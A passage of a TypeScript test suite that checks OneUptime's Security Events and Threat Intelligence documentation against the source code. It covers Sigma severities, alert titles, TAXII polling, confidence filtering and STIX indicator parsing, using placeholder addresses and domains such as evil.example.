    const namedAt: number = picker.indexOf(
      '(severity.name || "").toLowerCase() === severityLabel.toLowerCase()',
    );
    const rankedAt: number = picker.indexOf(
      "const chosen: TSeverity = isSevere ? severities[0]! : severities[severities.length - 1]!;",
    );
    const evaluator: string = flat(source("detectionEvaluator"));

    expect(explicitAt).toBeGreaterThan(0);
    expect(namedAt).toBeGreaterThan(explicitAt);
    expect(rankedAt).toBeGreaterThan(namedAt);
    // Severities arrive most severe first.
    expect(alerting).toContain("sort: { order: SortOrder.Ascending, },");

    for (const kind of ["alert", "incident"]) {
      expect(evaluator).toContain(
        `explicitSeverityId: data.rule.${kind}SeverityId, severityLabel: data.parsedRule.level, isSevere: isSevereSigmaLevel(data.parsedRule.level),`,
      );
    }

    expect(
      Object.values(SigmaLevel).filter((level: SigmaLevel): boolean => {
        return isSevereSigmaLevel(level);
      }),
    ).toEqual([SigmaLevel.High, SigmaLevel.Critical]);
    expect(numberedSteps(page, "Severity")).toEqual([
      "1. The rule's **Alert Severity** (or **Incident Severity**), when set.",
      "2. Your severity named after the level, such as High, whatever its case.",
      "3. By rank: `critical` and `high` rules take your most severe severity, the others your least severe.",
    ]);
  });

  it("maps each Sigma level onto the finding's OCSF severity as it says", () => {
    expect(
      Object.values(SigmaLevel).map((level: SigmaLevel): OcsfSeverity => {
        return SIGMA_LEVEL_TO_OCSF_SEVERITY[level];
      }),
    ).toEqual([
      OcsfSeverity.Informational,
      OcsfSeverity.Low,
      OcsfSeverity.Medium,
      OcsfSeverity.High,
      OcsfSeverity.Critical,
    ]);
    expect(page).toContain(
      "`informational`, `low`, `medium`, `high` and `critical` become Informational, Low, Medium, High and Critical.",
    );
  });

  it("titles a rule's alerts as the engine does, one open alert per rule and group value", () => {
    const evaluator: string = source("detectionEvaluator");

    expect(evaluator).toContain(
      "? `[Detection] ${rule.name} — ${matchGroup.groupValue}`",
    );
    expect(evaluator).toContain(": `[Detection] ${rule.name}`;");
    expect(flat(evaluator)).toContain(
      "fingerprint: this.buildFingerprint(rule.id!, matchGroup.groupValue),",
    );
    expect(evaluator).toContain("return openDedupedAlerts({");
    expect(evaluator).toContain(
      "has no alert severities; skipping alert creation for rule",
    );
    expect(page).toContain(
      "Each firing group opens an alert titled `[Detection] <rule name> — <group value>`, or `[Detection] <rule name>` for a rule without a Group By Field. While it is open, more matches for that group don't open another.",
    );
    expect(page).toContain(
      "A project needs at least one alert severity for rules to open alerts.",
    );
  });

  it("writes a Detection Finding of the class, product and attributes it names", () => {
    const rows: Array<Array<string>> = rowsOf(page, "Alerts and findings");

    expect(DETECTION_FINDING_CLASS_NAME).toBe("Detection Finding");
    expect(DETECTION_FINDING_CLASS_UID).toBe(2004);
    expect(source("detectionEvaluator")).toContain(
      'productName: "OneUptime Detections",',
    );
    expect(page).toContain(
      "A Detection Finding is a security event of class `Detection Finding` (OCSF class 2004) from the product `OneUptime Detections`",
    );
    expect(
      rows.map((row: Array<string>): string => {
        return codeSpans(row[0] as string)[0] as string;
      }),
    ).toEqual([
      DETECTION_RULE_ID_ATTRIBUTE,
      DETECTION_RULE_NAME_ATTRIBUTE,
      DETECTION_MATCH_COUNT_ATTRIBUTE,
      DETECTION_DISTINCT_COUNT_ATTRIBUTE,
      DETECTION_GROUP_VALUE_ATTRIBUTE,
      DETECTION_SIGMA_ID_ATTRIBUTE,
    ]);
  });

  it("builds the Security Events monitor in the form the product has", () => {
    const form: string = source("monitorForm");
    const options: Array<string> = allMatches(form, WINDOW_OPTION, 1);

    for (const title of [
      "Monitor events that include this text",
      "Monitor Security Events for (time)",
      "Event Severity",
      "Event Class",
      "Filter by Telemetry Service",
      "Filter by Attributes",
    ]) {
      expect(form).toContain(`title: "${title}",`);
      expect(boldSpans(page)).toContain(title);
    }

    expect(options[0]).toBe("Last 5 seconds");
    expect(options[options.length - 1]).toBe("Last 24 hours");
    expect(
      form.split("collapsibleSection: MORE_SECURITY_EVENT_FILTERS,").length - 1,
    ).toBe(2);
    expect(source("foldTitles")).toContain('translationKey("More fields")');
    expect(CheckOn.SecurityEventCount).toBe("Security Event Count");
    expect(MonitorType.SecurityEvents).toBe("Security Events");
    expect(MonitorTypeHelper.getCommonMonitorTypes()).not.toContain(
      MonitorType.SecurityEvents,
    );
    expect(
      rowNamed(rowsOf(page, "Security Events monitors"), "Window")[2],
    ).toBe("Rolling: the last 5 seconds to 24 hours");
    expect(page).toContain(
      "**Filter by Telemetry Service** and **Filter by Attributes** wait under **More fields**",
    );
    expect(page).toContain("Its criteria check **Security Event Count**.");
  });

  it("pre-fills a rule's monitor as it says: the Detection Finding class, the rule's id, the last hour", () => {
    const prefill: JSONObject = buildDetectionRuleMonitorPrefill({
      ruleId: "11111111-2222-4333-8444-555555555555",
      ruleName: "Failed logon burst",
      operationalStatusId: new ObjectID("aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee"),
    });
    const step: MonitorStepSecurityEventsMonitor =
      securityEventsStepOf(prefill);

    expect(prefill["monitorType"]).toBe(MonitorType.SecurityEvents);
    expect(step.classNames).toEqual([DETECTION_FINDING_CLASS_NAME]);
    expect(step.attributes).toEqual({
      [DETECTION_RULE_ID_ATTRIBUTE]: "11111111-2222-4333-8444-555555555555",
    });
    expect(step.lastXSecondsOfEvents).toBe(60 * 60);
    expect(DETECTION_FINDING_MONITOR_WINDOW_SECONDS).toBe(3600);
    expect(source("detectionRules")).toContain('title: "Create Monitor",');
    expect(page).toContain(
      "The **Create Monitor** action in a rule's row opens a new monitor already set up this way: the `Detection Finding` class, the rule's id (never its name, which a rename would change), and the last hour.",
    );
  });

  it("keeps events for the project's Default Retention (Days), set under Data Retention", () => {
    const settings: string = source("settingsSideMenu");
    const telemetry: string = settings.slice(
      settings.indexOf('title: "Telemetry & APM",'),
    );

    expect(source("telemetrySettings")).toContain(
      'title: "Default Retention (Days)",',
    );
    expect(telemetry.slice(0, 600)).toContain('title: "Data Retention",');
    expect(flat(source("ingestService"))).toContain(
      'resolveTelemetryRetentionInDays({ pillar: "securityEvents",',
    );
    expect(page).toContain(
      "the project's **Default Retention (Days)**, under **Project Settings → Telemetry & APM → Data Retention**, or a retention set on the telemetry service they belong to.",
    );
  });

  it("names the Setup Guide page, where the snippets carry the reader's own key", () => {
    expect(source("setupGuide")).toContain("/security-events/v1/ingest");
    expect(
      getSecurityEventsMenuSectionFor(PageMap.SECURITY_EVENTS_DOCUMENTATION)
        ?.title,
    ).toBe("Connections");
    expect(page).toContain(
      "The **Setup Guide** page, under **Connections**, has these snippets with your own host and key filled in.",
    );
  });
});

describe("the Threat Intelligence page", () => {
  const page: string = englishPage(THREAT_INTELLIGENCE);
  const now: Date = new Date("2026-08-27T12:00:00.000Z");
  const context: StixParseContext = {
    projectId: new ObjectID("22222222-2222-4222-8222-222222222222"),
    feedId: new ObjectID("11111111-1111-4111-8111-111111111111"),
    feedName: "Docs feed",
    minimumConfidence: 0,
  };

  function stixIndicator(overrides: JSONObject = {}): JSONObject {
    return {
      type: "indicator",
      id: "indicator--0001",
      pattern: "[ipv4-addr:value = '198.51.100.7']",
      pattern_type: "stix",
      created: "2026-08-20T00:00:00.000Z",
      valid_from: "2026-08-20T00:00:00.000Z",
      confidence: 80,
      ...overrides,
    };
  }

  function ingest(
    overrides: JSONObject = {},
    minimumConfidence: number = 0,
  ): StixIndicatorParseResult {
    return ThreatIntelFeedPoller.parseStixIndicator(
      stixIndicator(overrides),
      { ...context, minimumConfidence },
      now,
    );
  }

  function clickhouseDate(value: unknown): number {
    return new Date(`${String(value).replace(" ", "T")}Z`).getTime();
  }

  it("opens the feeds from Products → Security Events → Detections → Threat Intel", () => {
    // Threat Intel is a page of the Detections section.
    expect(
      getSecurityEventsMenuSectionFor(PageMap.SECURITY_EVENTS_THREAT_INTEL)
        ?.title,
    ).toBe("Detections");
    expect(page).toContain(
      "Open **Products → Security Events → Detections → Threat Intel**.",
    );
  });

  it("creates a feed from its source, then the source's own step, with its fields", () => {
    const page_: string = flat(source("threatIntel"));
    // The page, the On Match step it shares, and the choices' words.
    const form: string = [
      page_,
      flat(source("securityMatchFields")),
      flat(source("securityMatchRaises")),
    ].join(" ");
    const rows: Array<Array<string>> = rowsOf(page, "Subscribe a feed");

    expect(page_).toContain(
      'formSteps={[ { title: "Source", id: "source" }, {',
    );
    expect(page_).toContain('title: "List", id: "list",');
    expect(page_).toContain('title: "TAXII Server", id: "taxii-server",');
    expect(page_).toContain('title: "Google SecOps", id: "google-secops",');
    expect(page_).toContain(
      '{ title: TAXII_SIGN_IN_FIELD_TITLE, id: "sign-in",',
    );
    expect(page_).toContain('{ title: "On Match", id: "on-match" }, ]}');
    expect(TAXII_SIGN_IN_FIELD_TITLE).toBe("Sign-in");
    expect(page).toContain(
      "Click **Create Threat Intel Feed** and pick its **Source**: **List of indicators**, **TAXII collection** or **Google SecOps**. The next step asks for that source alone: a list's **List URL**, a collection's **TAXII Server** and **Sign-in**, or the **Google SecOps Connection**. **On Match** comes last.",
    );

    // The sources, in the form's order and words.
    expect(
      THREAT_INTEL_FEED_TYPE_DEFINITIONS.map(
        (definition: ThreatIntelFeedTypeDefinition): string => {
          return definition.title;
        },
      ),
    ).toEqual(["List of indicators", "TAXII collection", "Google SecOps"]);

    // Every field a row names is one the form draws, by that title.
    for (const row of rows) {
      for (const title of boldSpans(row[0] as string)) {
        expect({
          title,
          drawn:
            form.includes(`title: "${title}",`) ||
            form.includes(`translationKey("${title}")`) ||
            form.includes(`translationKey( "${title}", )`),
        }).toEqual({ title, drawn: true });
      }
    }

    // How the feed signs in: one choice, its answers in the form's words.
    expect(
      TAXII_SIGN_IN_ANSWERS.map((answer: string): string => {
        return TAXII_SIGN_IN_COPY[answer as keyof typeof TAXII_SIGN_IN_COPY]
          .title;
      }),
    ).toEqual(["No sign-in", "Bearer token", "Username and password"]);
    expect(rowNamed(rows, "**Sign-in**")[1]).toBe(
      "How OneUptime signs in: **No sign-in** for a public collection, **Bearer token** for a token the server's operator gave you, or **Username and password** for HTTP basic auth.",
    );
  });

  it("names the feed's columns the first poll fills, and the Indicators table", () => {
    const form: string = source("threatIntel");

    for (const title of [
      "Last Polled",
      "Last Poll Summary",
      "Last Error",
      "Last Evaluated",
      "Last Match Error",
      "Indicators",
      "Status",
    ]) {
      expect(form).toContain(`title: "${title}",`);
    }

    expect(page).toContain(
      "Within a minute or two the feed's row shows **Last Polled**, and **Last Poll Summary** says what the poll fetched. Indicators appear in the **Indicators** table under the feeds.",
    );
  });

  it("states the poll interval's and the minimum confidence's ranges and defaults as the server holds them", () => {
    const rows: Array<Array<string>> = rowsOf(page, "Subscribe a feed");
    const form: string = flat(source("threatIntel"));

    expect(THREAT_INTEL_POLL_INTERVAL_MIN_IN_MINUTES).toBe(1);
    expect(THREAT_INTEL_POLL_INTERVAL_MAX_IN_MINUTES).toBe(1440);
    expect(THREAT_INTEL_DEFAULT_POLL_INTERVAL_IN_MINUTES).toBe(60);
    expect(form).toContain(
      "pollIntervalInMinutes: THREAT_INTEL_DEFAULT_POLL_INTERVAL_IN_MINUTES,",
    );
    expect(rowNamed(rows, "**Poll Interval (Minutes)**")[1]).toBe(
      `How often to read the source: 1 to 1440 minutes, 60 by default. A list is read every ${THREAT_INTEL_LIST_MIN_POLL_INTERVAL_IN_MINUTES} minutes at most.`,
    );
    expect(THREAT_INTEL_MINIMUM_CONFIDENCE_MIN).toBe(0);
    expect(THREAT_INTEL_MINIMUM_CONFIDENCE_MAX).toBe(100);
    expect(form).toContain("minimumConfidence: 0,");
    expect(rowNamed(rows, "**Minimum Confidence**")[1]).toBe(
      "For a TAXII collection or Google SecOps: indicators with a lower confidence are skipped, 0 to 100, 0 keeps everything. Indicators with no confidence always pass.",
    );
  });

  it("skips indicators below the minimum confidence, keeps everything at 0, and always passes unscored ones", () => {
    expect(ingest({ confidence: 69 }, 70).outcome).toBe("filtered");
    expect(ingest({ confidence: 70 }, 70).outcome).toBe("ingested");
    expect(ingest({ confidence: 1 }, 0).outcome).toBe("ingested");
    expect(ingest({ confidence: undefined }, 70).outcome).toBe("ingested");
  });

  it("says which match actions are on by default, as the form starts them", () => {
    const rows: Array<Array<string>> = rowsOf(page, "Subscribe a feed");
    const form: string = flat(source("threatIntel"));

    expect(form).toContain(
      "shouldCreateAlert: true, shouldWriteDetectionFinding: true, shouldCreateIncident: false,",
    );
    // Those columns make Create an alert, the choice's default.
    expect(
      getSecurityMatchRaises({
        shouldCreateAlert: true,
        shouldCreateIncident: false,
      }),
    ).toBe(SECURITY_MATCH_RAISES_ANSWERS[0]);
    expect(rowNamed(rows, "**Alerts and Incidents**")[1]).toMatch(
      /^\*\*Create an alert\*\* by default/,
    );
    expect(rowNamed(rows, "**Declare an incident** or **Both**")[1]).toMatch(
      /^Under \*\*Alerts and Incidents\*\*\./,
    );
    expect(rowNamed(rows, "**Write Detection Finding on Match**")[1]).toMatch(
      /^On by default/,
    );
  });

  it("keeps tokens and passwords encrypted and unreadable, and replaces the whole sign-in on Update Credentials", () => {
    const feed: ThreatIntelFeed = new ThreatIntelFeed();
    const form: string = flat(source("threatIntel"));

    for (const secret of ["apiToken", "basicAuthPassword"]) {
      expect(feed.getEncryptedColumns().columns).toContain(secret);
      expect(feed.getColumnAccessControlFor(secret)?.read).toEqual([]);
    }

    // The dialog asks the feed's Sign-in again, in the same words.
    expect(form).toContain(
      "radioButtonOptions: getTaxiiSignInChoices({ anonymousDescription: TAXII_SIGN_IN_CLEAR_DESCRIPTION, }),",
    );

    expect(form).toContain('title: "Update Credentials",');
    expect(form).toContain(
      'if (mode === "api-token" && data["apiToken"]) { update = { apiToken: data["apiToken"], basicAuthUsername: null, basicAuthPassword: null, };',
    );
    expect(form).toContain(
      '} else if (mode === "basic-auth" && data["basicAuthPassword"]) { update = { apiToken: null,',
    );
    expect(form).toContain(
      '} else if (mode === "anonymous") { update = { apiToken: null, basicAuthUsername: null, basicAuthPassword: null, };',
    );
    expect(page).toContain(
      "A TAXII feed's tokens and passwords are encrypted and never shown again after you save them. To change them, pick **Update Credentials** in the feed's row and choose **Bearer token**, **Username and password** or **No sign-in**, which clears what is stored: your choice replaces the feed's sign-in, so saving a token clears a stored password, and the other way round.",
    );
  });

  it("polls with TAXII's added_after cursor, up to 10 pages of 500 objects, and says when more pages remain", () => {
    const poller: string = flat(source("feedPoller"));

    expect(poller).toContain("export const TAXII_PAGE_SIZE: number = 500;");
    expect(poller).toContain("export const MAX_PAGES_PER_POLL: number = 10;");
    expect(poller).toContain(
      '"more pages remain; the next poll continues from the cursor",',
    );
    expect(source("taxiiClient")).toContain(
      'searchParams.set("added_after", params.addedAfter);',
    );
    expect(page).toContain(
      "Each poll asks for the objects added since the previous one, through TAXII's `added_after` cursor, and reads up to 10 pages of 500 objects. A large collection therefore syncs over several polls: **Last Poll Summary** says when more pages remain.",
    );
  });

  it("names the user agent polls send, as the outbound user agent builds it", () => {
    const named: string = (
      page.match(NAMED_USER_AGENT) as RegExpMatchArray
    )[1] as string;

    expect(named.replace("<version>", "9.1.2")).toBe(
      OutboundUserAgent.build("9.1.2"),
    );
    expect(source("taxiiClient")).toContain("import DataSourceHttpFetch, {");
    expect(source("httpFetch")).toContain("OutboundUserAgent.withDefault(");
  });

  it("neither polls nor matches a disabled feed", () => {
    expect(flat(source("feedPoller"))).toContain("isEnabled: true,");
    expect(flat(source("matcher"))).toContain("isEnabled: true,");
    expect(page).toContain("A disabled feed is neither polled nor matched.");
  });

  it("keeps only STIX indicator objects", () => {
    expect(ingest({ type: "attack-pattern" }).outcome).toBe("not-indicator");
    expect(ingest().outcome).toBe("ingested");
    expect(page).toContain(
      "From a TAXII collection, OneUptime keeps STIX `indicator` objects whose pattern is plain equality on one of these types. A list and Google SecOps give the same types:",
    );
  });

  it("lists the free lists OneUptime adds in one click, as the catalog defines them", () => {
    const rows: Array<Array<string>> = rowsOf(page, "Add a free list");

    expect(
      rows.map((row: Array<string>): Array<string> => {
        return [row[0] as string, row[1] as string, row[3] as string];
      }),
    ).toEqual(
      RECOMMENDED_THREAT_INTEL_LISTS.map(
        (list: RecommendedThreatIntelList): Array<string> => {
          return [
            list.title,
            list.provider,
            `${list.indicatorConfidence}, ${ocsfSeverityForConfidence(list.indicatorConfidence)}`,
          ];
        },
      ),
    );

    for (const [index, list] of RECOMMENDED_THREAT_INTEL_LISTS.entries()) {
      const row: Array<string> = rows[index] as Array<string>;

      expect(row[2]).toBe(
        list.pollIntervalInMinutes === 1440 ? "Every day" : "Every hour",
      );
      expect(row[4]).toBe(list.raisesAlerts ? "A case and an alert" : "A case");
    }
  });

  it("reads a list as the list parser and source read it", () => {
    expect(THREAT_INTEL_LIST_VALID_DAYS).toBe(2);
    expect(THREAT_INTEL_LIST_MAX_INDICATORS).toBe(50000);
    expect(
      IndicatorListParser.parse(
        "# comment\n; comment\n// comment\n203.0.113.7:443 C2\n198.51.100.0/24\nevil.example,x",
        { maxValues: 10 },
      ),
    ).toMatchObject({
      values: [
        { type: ThreatIntelIndicatorType.Ipv4Address, value: "203.0.113.7" },
        { type: ThreatIntelIndicatorType.DomainName, value: "evil.example" },
      ],
      unsupported: 1,
    });
    expect(page).toContain(
      "Lines starting with `#`, `;` or `//` are comments, a port after an address or a domain is dropped, and an address range such as `198.51.100.0/24` is skipped.",
    );
    expect(page).toContain(
      `A value stays an active indicator for ${THREAT_INTEL_LIST_VALID_DAYS} days after the poll that last read it, and a value the list drops stops matching at the next poll.`,
    );
    expect(page).toContain("A list holds at most 50,000 indicators.");
  });

  it("reads Google SecOps's indicators for the window and validity the source uses", () => {
    expect(THREAT_INTEL_GOOGLE_SECOPS_MAX_WINDOW_IN_DAYS).toBe(7);
    expect(THREAT_INTEL_GOOGLE_SECOPS_VALID_DAYS).toBe(30);
    expect(page).toContain("The first poll reads the last 7 days.");
    expect(page).toContain(
      "An indicator stays active for 30 days after Google SecOps last saw it, or until its source says it stops being active, and one an analyst muted in Google SecOps stops matching here too.",
    );
    expect(ThreatIntelFeedType.GoogleSecOps).toBe("google-secops");
  });

  it("reads each example pattern of the types table as one indicator of its type", () => {
    const rows: Array<Array<string>> = rowsOf(page, "What gets ingested");

    expect(rows.length).toBe(Object.values(ThreatIntelIndicatorType).length);

    for (const row of rows) {
      const type: string = codeSpans(row[0] as string)[0] as string;
      const pattern: string = codeSpans(row[1] as string)[0] as string;
      const parsed: Array<ParsedIndicatorValue> | null =
        StixPatternParser.parse(pattern);

      expect({
        type,
        parsed: parsed?.map((value: ParsedIndicatorValue): string => {
          return value.type;
        }),
      }).toEqual({
        type,
        parsed: [type],
      });
    }
  });

  it("takes OR-joined comparisons as one indicator each, and skips anything else whole, counting it as unsupported", () => {
    const examples: Array<string> = codeBlocksOf(
      section(page, "What gets ingested"),
    )[0]!
      .split(LINE_BREAK)
      .filter((line: string): boolean => {
        return line.trim().length > 0;
      });

    expect(examples.length).toBe(2);

    for (const example of examples) {
      expect(StixPatternParser.parse(example)?.length).toBe(2);
      expect(ingest({ pattern: example }).rows.length).toBe(2);
    }

    for (const pattern of [
      "[ipv4-addr:value = '198.51.100.7' AND domain-name:value = 'evil.example']",
      "[ipv4-addr:value = '198.51.100.7'] FOLLOWEDBY [url:value = 'http://evil.example/x']",
      "[ipv4-addr:value != '198.51.100.7']",
      "[url:value LIKE 'http://evil%']",
      "[url:value MATCHES '^http://evil']",
      "[ipv4-addr:value = '198.51.100.7'] WITHIN 300 SECONDS",
      "[process:name = 'evil.exe']",
    ]) {
      expect({ pattern, parsed: StixPatternParser.parse(pattern) }).toEqual({
        pattern,
        parsed: null,
      });
      expect({ pattern, outcome: ingest({ pattern }).outcome }).toEqual({
        pattern,
        outcome: "unsupported",
      });
    }

    expect(flat(source("feedPoller"))).toContain(
      "parts.push(`skipped ${result.unsupportedPatterns} unsupported patterns`);",
    );
  });

  it("stores values in lowercase", () => {
    expect(
      StixPatternParser.parse("[domain-name:value = 'Evil.EXAMPLE']"),
    ).toEqual([
      { type: ThreatIntelIndicatorType.DomainName, value: "evil.example" },
    ]);
    expect(
      ingest({ pattern: "[domain-name:value = 'Evil.EXAMPLE']" }).rows[0]![
        "indicatorValue"
      ],
    ).toBe("evil.example");
    expect(flat(source("indicatorService"))).toContain(
      ") AS i ON lowerUTF8(matchedObservable) = i.indicatorValue",
    );
    expect(page).toContain(
      "- Values are stored in lowercase and matched whatever their case.",
    );
  });

  it("keeps an indicator without valid_until active for 365 days from valid_from, and a revoked or lapsed one inactive", () => {
    const row: JSONObject = ingest().rows[0] as JSONObject;

    expect(THREAT_INTEL_DEFAULT_VALID_DAYS).toBe(365);
    expect(
      clickhouseDate(row["validUntil"]) - clickhouseDate(row["validFrom"]),
    ).toBe(365 * DAY_IN_MILLISECONDS);
    expect(clickhouseDate(row["validFrom"])).toBe(
      new Date("2026-08-20T00:00:00.000Z").getTime(),
    );
    expect(ingest({ revoked: true }).deadOnArrival).toBe(true);
    expect(
      ingest({ valid_until: "2026-08-21T00:00:00.000Z" }).deadOnArrival,
    ).toBe(true);
    expect(ingest().deadOnArrival).toBe(false);
    expect(page).toContain(
      "With no `valid_until`, it stays active for 365 days from `valid_from`, and polling it again doesn't extend that.",
    );
    expect(page).toContain(
      "- A revoked indicator, or one updated with a `valid_until` in the past, stops matching as soon as the update is polled.",
    );
  });

  it("shows an indicator's Status as Active, Expired or Revoked, as the table draws it", () => {
    const form: string = source("threatIntel");

    for (const status of ["Revoked", "Expired", "Active"]) {
      expect(form).toContain(`text="${status}"`);
    }

    expect(page).toContain(
      "with a **Status** of **Active**, **Expired** or **Revoked**.",
    );
  });

  it("stamps a matched event with the threat.* attributes it lists, the highest confidence winning", () => {
    const rows: Array<Array<string>> = rowsOf(page, "Tagged as events arrive");

    expect(
      rows.flatMap((row: Array<string>): Array<string> => {
        return codeSpans(row[0] as string);
      }),
    ).toEqual([
      ENRICHMENT_MATCHED_ATTRIBUTE,
      ENRICHMENT_INDICATOR_ID_ATTRIBUTE,
      ENRICHMENT_INDICATOR_TYPE_ATTRIBUTE,
      ENRICHMENT_INDICATOR_VALUE_ATTRIBUTE,
      ENRICHMENT_FEED_ATTRIBUTE,
      ENRICHMENT_FEED_ID_ATTRIBUTE,
      ENRICHMENT_CONFIDENCE_ATTRIBUTE,
      ENRICHMENT_MATCH_COUNT_ATTRIBUTE,
    ]);
    expect(rowNamed(rows, "`threat.matched`")[1]).toBe(
      `Always \`"${ENRICHMENT_MATCHED_VALUE}"\` on a tagged event`,
    );
    expect(source("enricher")).toContain(
      "if (!best || indicator.confidence > best.confidence) {",
    );
    expect(page).toContain(
      "When several indicators match one event, the one with the highest confidence fills in these values.",
    );
  });

  it("compiles the page's rule on threat.* attributes, as attributes", () => {
    const yaml: string = codeBlockTitled(page, "threat-intel-logon.yml");
    const rule: SigmaRule = SigmaRuleParser.parse(yaml);
    const statement: Statement = compiledSql(yaml);

    expect(rule.level).toBe(SigmaLevel.Critical);
    expect(boundValues(statement)).toEqual(
      expect.arrayContaining([
        ENRICHMENT_MATCHED_ATTRIBUTE,
        ENRICHMENT_CONFIDENCE_ATTRIBUTE,
      ]),
    );
    expect(statement.query).toContain(">=");
  });

  it("matches every minute: 15 minutes first, at most 24 hours back, recording every value and opening cases for the 100 seen in the most events", () => {
    const matcher: string = flat(source("matcher"));
    const indicators: string = flat(source("indicatorService"));

    expect(source("matchJob")).toContain("schedule: EVERY_MINUTE,");
    expect(source("pollJob")).toContain("schedule: EVERY_MINUTE,");
    expect(THREAT_INTEL_FIRST_MATCH_WINDOW_IN_MINUTES).toBe(15);
    expect(THREAT_INTEL_MATCH_MAX_LOOKBACK_IN_MINUTES).toBe(24 * 60);
    expect(THREAT_INTEL_MAX_INDICATORS_PER_EVALUATION).toBe(100);
    expect(THREAT_INTEL_MAX_FINDINGS_PER_EVALUATION).toBe(10000);
    expect(matcher).toContain(
      "maxGroups: THREAT_INTEL_MAX_FINDINGS_PER_EVALUATION + 1,",
    );
    expect(matcher).toContain(
      "openLimit: MAX_GROUPS_PER_EVALUATION, recordLimit: THREAT_INTEL_MAX_FINDINGS_PER_EVALUATION,",
    );
    expect(matcher).toContain(
      "let startTime: Date = feed.lastEvaluatedAt ? feed.lastEvaluatedAt : OneUptimeDate.addRemoveMinutes( endTime, -THREAT_INTEL_FIRST_MATCH_WINDOW_IN_MINUTES, ); if (OneUptimeDate.isBefore(startTime, earliestAllowed)) { startTime = earliestAllowed; }",
    );
    expect(indicators).toContain(
      "AS e ARRAY JOIN e.observables AS matchedObservable",
    );
    expect(indicators).toContain(
      "GROUP BY i.indicatorValue ORDER BY matchCount DESC LIMIT",
    );
    expect(page).toContain(
      "- The first check covers the last 15 minutes. After an outage, the next check catches up on at most the last 24 hours.",
    );
    expect(page).toContain(
      "- Each check records every matched indicator value as a finding, up to 10,000 per feed. Alerts, incidents and cases open for the 100 values seen in the most events; the rest share one case about the feed, and the feed's **Last Match Error** says how many matched.",
    );
    expect(page).toContain(
      "Matching compares an indicator's value with an event's observables, not with every field",
    );
  });

  it("never matches a finding, so one match can't set off another", () => {
    expect(flat(source("indicatorService"))).toContain(
      `AND e.classUid != \${{ type: TableColumnType.Number, value: ${DETECTION_FINDING_CLASS_UID}, }}`,
    );
    expect(page).toContain(
      "Findings are never matched themselves, so one match can't set off another.",
    );
  });

  it("titles a match's alert as the matcher does, one per feed and value, and writes a finding of the product it names", () => {
    const rows: Array<Array<string>> = rowsOf(page, "What a match does");
    const matcher: string = source("matcher");

    expect(matcher).toContain(
      "title: `[Threat Intel] ${feed.name} — ${matchGroup.indicatorValue}`,",
    );
    expect(matcher).toContain("return `threat-intel:${feedId.toString()}:");
    expect(matcher).toContain(
      "has no alert severities; skipping alert creation for feed",
    );
    expect(THREAT_INTEL_PRODUCT_NAME).toBe("OneUptime Threat Intel");
    expect(page).toContain(
      "- An alert, titled `[Threat Intel] <feed name> — <indicator value>`, one per feed and value while it stays open.",
    );
    expect(page).toContain(
      "a `Detection Finding` event (OCSF class 2004) from the product `OneUptime Threat Intel`",
    );
    expect(page).toContain(
      "A project needs at least one alert severity for a feed to open alerts.",
    );
    expect(
      rows.flatMap((row: Array<string>): Array<string> => {
        return codeSpans(row[0] as string);
      }),
    ).toEqual([
      THREAT_FEED_ID_ATTRIBUTE,
      THREAT_FEED_NAME_ATTRIBUTE,
      THREAT_INDICATOR_ID_ATTRIBUTE,
      THREAT_INDICATOR_TYPE_ATTRIBUTE,
      THREAT_INDICATOR_VALUE_ATTRIBUTE,
      THREAT_CONFIDENCE_ATTRIBUTE,
      THREAT_MATCH_COUNT_ATTRIBUTE,
    ]);
  });

  it("bands confidence into threat levels exactly as the code does", () => {
    const rows: Array<Array<string>> = rowsOf(page, "Threat levels");

    for (const row of rows.slice(0, 4)) {
      const [low, high] = (row[0] as string).split(" to ").map(Number) as [
        number,
        number,
      ];
      const level: string = row[1] as string;

      for (const confidence of [low, high]) {
        expect({
          confidence,
          level: ocsfSeverityForConfidence(confidence),
        }).toEqual({
          confidence,
          level,
        });
      }

      // One below the band's floor is in the band beneath.
      expect(ocsfSeverityForConfidence(low - 1)).not.toBe(level);
    }

    expect(rowNamed(rows, "Not scored (0 or missing)")[1]).toBe(
      OcsfSeverity.Medium,
    );
    expect(ocsfSeverityForConfidence(0)).toBe(OcsfSeverity.Medium);
    expect(ocsfSeverityForConfidence(Number.NaN)).toBe(OcsfSeverity.Medium);
  });

  it("keeps only High and Critical indicators at a minimum of 70", () => {
    for (let confidence: number = 1; confidence <= 100; confidence++) {
      const level: OcsfSeverity = ocsfSeverityForConfidence(confidence);

      expect({
        confidence,
        severe: level === OcsfSeverity.High || level === OcsfSeverity.Critical,
      }).toEqual({ confidence, severe: confidence >= 70 });
    }

    expect(page).toContain(
      "a minimum of 70 keeps only High and Critical indicators, plus unscored ones, which always pass.",
    );
  });

  it("picks the alert's severity in the order the matcher does, per indicator", () => {
    const matcher: string = flat(source("matcher"));

    for (const kind of ["alert", "incident"]) {
      expect(matcher).toContain(
        `explicitSeverityId: feed.${kind}SeverityId, severityLabel: severity, isSevere: this.isSevereSeverity(severity),`,
      );
    }

    expect(matcher).toContain(
      "return severity === OcsfSeverity.Critical || severity === OcsfSeverity.High;",
    );
    expect(matcher).toContain("this.partitionBySeverity(");
    expect(numberedSteps(page, "Threat levels")).toEqual([
      "1. The feed's **Alert Severity** (or **Incident Severity**), when set: it applies to every match from the feed.",
      "2. Your severity named after the threat level, such as High, whatever its case.",
      "3. By rank: Critical and High take your most severe severity, Medium and Low your least severe.",
    ]);
  });

  it("pre-fills a feed's monitor as it says: the Detection Finding class, the feed's id, the last hour", () => {
    const prefill: JSONObject = buildThreatIntelFeedMonitorPrefill({
      feedId: "66666666-7777-4888-8999-000000000000",
      feedName: "Abuse feed",
      operationalStatusId: null,
    });
    const step: MonitorStepSecurityEventsMonitor =
      securityEventsStepOf(prefill);

    expect(prefill["monitorType"]).toBe(MonitorType.SecurityEvents);
    expect(step.classNames).toEqual([DETECTION_FINDING_CLASS_NAME]);
    expect(step.attributes).toEqual({
      [THREAT_FEED_ID_ATTRIBUTE]: "66666666-7777-4888-8999-000000000000",
    });
    expect(step.lastXSecondsOfEvents).toBe(60 * 60);
    expect(source("threatIntel")).toContain('title: "Create Monitor",');
    expect(page).toContain(
      "event class `Detection Finding`, filtered by the feed's id in `oneuptime.threat.feed_id` (never its name, which a rename would change), over the last hour.",
    );
  });

  it("reads Last Poll Summary in the words the poller writes", () => {
    const poller: string = flat(source("feedPoller"));

    for (const words of [
      "below minimum confidence",
      "already inactive (revoked or expired)",
      "unsupported patterns",
    ]) {
      expect(poller).toContain(words);
    }

    expect(page).toContain(
